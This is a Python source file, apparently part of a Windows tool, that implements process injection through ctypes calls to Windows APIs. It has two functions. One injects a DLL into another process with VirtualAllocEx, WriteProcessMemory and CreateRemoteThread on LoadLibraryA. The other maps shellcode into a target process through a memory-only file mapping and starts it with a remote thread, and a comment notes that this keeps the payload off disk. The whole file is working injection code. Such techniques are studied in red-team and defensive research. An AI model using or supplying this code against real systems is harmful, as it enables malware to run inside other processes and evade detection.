# injection.py
# Created by Starwarsfan2099 on 1/11/2020

import utilities
from colorama import Fore
from ctypes import *
from ctypes.wintypes import *

utils = utilities.Utilities.getInstance()

# Windows Constants
PAGE_READWRITE =            0x04
PAGE_EXECUTE_READWRITE =    0x40
PAGE_EXECUTE_READ =         0x20
PROCESS_CREATE_THREAD =     0x0002
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_OPERATION =      0x0008
PROCESS_VM_WRITE =          0x0020
PROCESS_VM_READ =           0x0010
PROCESS_ALL_ACCESS =        (0x00F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM =               (0x1000 | 0x2000)
FILE_MAP_WRITE =            0x0002
INVALID_HANDLE_VALUE =      HANDLE(-1)
NUMA_NO_PREFERRED_NODE =    DWORD(-1)


# Windows types needed
class SECURITY_ATTRIBUTES(Structure):
    _fields_ = [ ('nLength', DWORD),
                 ('lpSecurityDescriptor', LPVOID),
                 ('bInheritHandle', BOOL) ]

LPDWORD = POINTER(DWORD)
FARPROC = CFUNCTYPE(None)
LPSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = WINFUNCTYPE(DWORD, LPVOID)

# DLL's to import functions from
kernel32 = windll.kernel32
KernelBase = windll.KernelBase

def dllInject(pid, dll, verbose):
    if ":" not in dll:
        utils.dbgPrint("\n[-] For the DLL, you must use its absolute path.\n", Fore.RED)
        return False
    try:
        f = open(dll)
        f.close()
    except IOError:
        utils.dbgPrint("\n[-] DLL file not found.\n", Fore.RED)
        return False

    dllLength = len(dll)

    # Get handle to process being injected...
    hProc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

    if not hProc:
        utils.dbgPrint("\n[-] Couldn't get handle to PID: %s\n" % pid, Fore.RED)
        return False

    # Allocate space for DLL path
    dllAddress = kernel32.VirtualAllocEx(hProc, 0, dllLength, VIRTUAL_MEM, PAGE_READWRITE)

    # Write DLL path to allocated space
    written = c_int(0)
    kernel32.WriteProcessMemory(hProc, dllAddress, dll, dllLength, byref(written))

    # Resolve LoadLibraryA Address
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    utils.dbgPrint("\n[+] Resolved kernel32 library at 0x%08x." % h_kernel32, Fore.GREEN, verbose=verbose)

    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
    utils.dbgPrint("[+] Resolved LoadLibraryA function at 0x%08x." % h_loadlib, Fore.GREEN, verbose=verbose)

    # Now we createRemoteThread with entrypoiny set to LoadLibraryA and pointer to DLL path as param
    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(hProc, None, 0, h_loadlib, dllAddress, 0, byref(thread_id)):
        utils.dbgPrint("[-] Failed to inject DLL.", Fore.RED)
        error = kernel32.GetLastError()
        utils.dbgPrint("[-] Injection Failed, exiting with error code: %s\n" % error, Fore.RED)
        return False

    utils.dbgPrint("[+] Remote Thread with ID 0x%08x created.\n" % thread_id.value, Fore.GREEN)
    error = kernel32.GetLastError()
    utils.dbgPrint("[-] Last error code: %s\n" % error, Fore.RED, verbose=verbose)
    return True

def shellcodeInjectMapping(pid, verbose):
    from shellcode import shellcode

    # https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    kernel32.OpenProcess.restype = HANDLE       # HANDLE OpenProcess(
    kernel32.OpenProcess.argtypes = [DWORD,     # DWORD dwDesiredAccess,
                                     c_bool,    # BOOL  bInheritHandle,
                                     DWORD]     # DWORD dwProcessId );

    # https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
    kernel32.CreateFileMappingA.restype = HANDLE        # HANDLE CreateFileMappingA(
    kernel32.CreateFileMappingA.argtypes = [HANDLE,     # HANDLE                hFile,
                                            LPVOID,     # LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
                                            DWORD,      # DWORD                 flProtect,
                                            DWORD,      # DWORD                 dwMaximumSizeHigh,
                                            DWORD,      # DWORD                 dwMaximumSizeLow,
                                            LPCSTR]     # LPCSTR                lpName );

    # https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile
    kernel32.MapViewOfFile.restype = LPVOID         # LPVOID MapViewOfFile(
    kernel32.MapViewOfFile.argtypes = [HANDLE,      # HANDLE hFileMappingObject,
                                       DWORD,       # DWORD  dwDesiredAccess,
                                       DWORD,       # DWORD  dwFileOffsetHigh,
                                       DWORD,       # DWORD  dwFileOffsetLow,
                                       c_size_t]    # SIZE_T dwNumberOfBytesToMap );

    # https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019
    cdll.msvcrt.memcpy.restype = c_void_p       # void *memcpy(
    cdll.msvcrt.memcpy.argtypes = [c_void_p,    # void *dest,
                                   c_char_p,    # const void *src,
                                   c_int]       # size_t count );

    # https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffilenuma2
    KernelBase.MapViewOfFileNuma2.restype = LPVOID          # PVOID MapViewOfFileNuma2(
    KernelBase.MapViewOfFileNuma2.argtypes = [HANDLE,       # HANDLE  FileMappingHandle,
                                              HANDLE,       # HANDLE  ProcessHandle,
                                              c_ulonglong,  # ULONG64 Offset,
                                              c_void_p,     # PVOID   BaseAddress,
                                              c_size_t,     # SIZE_T  ViewSize,
                                              c_ulong,      # ULONG   AllocationType,
                                              c_ulong,      # ULONG   PageProtection,
                                              c_ulong]      # ULONG   PreferredNode );

    # https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    kernel32.CreateRemoteThread.restype = HANDLE                        # HANDLE CreateRemoteThread(
    kernel32.CreateRemoteThread.argtypes = [HANDLE,                     # HANDLE                 hProcess,
                                            LPSECURITY_ATTRIBUTES,      # LPSECURITY_ATTRIBUTES  lpThreadAttributes,
                                            c_size_t,                   # SIZE_T                 dwStackSize,
                                            LPTHREAD_START_ROUTINE,     # LPTHREAD_START_ROUTINE lpStartAddress,
                                            LPVOID,                     # LPVOID                 lpParameter,
                                            DWORD,                      # DWORD                  dwCreationFlags,
                                            LPDWORD]                    # LPDWORD                lpThreadId );

    # Get a handle to the target process
    hProc = kernel32.OpenProcess(
        (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ),
        False, DWORD(int(pid)))

    if not hProc:
        utils.dbgPrint("[-] Couldn't get handle to PID: %s" % pid, Fore.RED)
        return False

    # Create a file mapping object so the shellcode doesn't have to be put on disk. This is achieved by using INVALID_HANDLE_VALUE as the first parameter.
    hFileMap = kernel32.CreateFileMappingA(INVALID_HANDLE_VALUE, None, PAGE_EXECUTE_READWRITE, 0, len(shellcode), None)
    if not hFileMap:
        utils.dbgPrint("[-] CreateFileMapping failed with error: %s" % kernel32.GetLastError(), Fore.RED)
        return False
    utils.dbgPrint("[*] Created global file mapping object.", Fore.GREEN)

    # Create a local view with write permissions for copying shellcode into.
    lpMapAddress = kernel32.MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, len(shellcode))
    if not lpMapAddress:
        utils.dbgPrint("[-] MapViewOfFile failed with error: %s" % kernel32.GetLastError(), Fore.RED)
        return False

    # Place the shellcode into the mapping object.
    cdll.msvcrt.memcpy(lpMapAddress, shellcode, len(shellcode))
    utils.dbgPrint("[*] Written %s bytes to the global mapping object" % len(shellcode), Fore.GREEN, verbose=verbose)

    # Map in the memory we copied to the target process.
    lpMapAddressRemote = KernelBase.MapViewOfFileNuma2(hFileMap, hProc, 0, None, 0, 0, PAGE_EXECUTE_READ,
                                                       NUMA_NO_PREFERRED_NODE)
    if not lpMapAddressRemote:
        utils.dbgPrint("[-] MapViewOfFile2 failed with error: %s" % kernel32.GetLastError(), Fore.RED)
        return False
    utils.dbgPrint("[*] Injected global object mapping to the remote process with pid %s" % pid, Fore.GREEN, verbose=verbose)

    # Create a remote thread pointing to the starting address returned by MayViewOfFileNuma2.
    hRemoteThread = kernel32.CreateRemoteThread(hProc, None, 0, LPTHREAD_START_ROUTINE(lpMapAddressRemote), None, 0,
                                                None)
    if not hRemoteThread:
        utils.dbgPrint("[-] CreateRemoteThread failed with error: %s" % kernel32.GetLastError(), Fore.RED)
        return False

    utils.dbgPrint("[+] Remote thread Started!", Fore.GREEN)
    kernel32.UnmapViewOfFile(lpMapAddress)
    kernel32.CloseHandle(hFileMap)
    return True
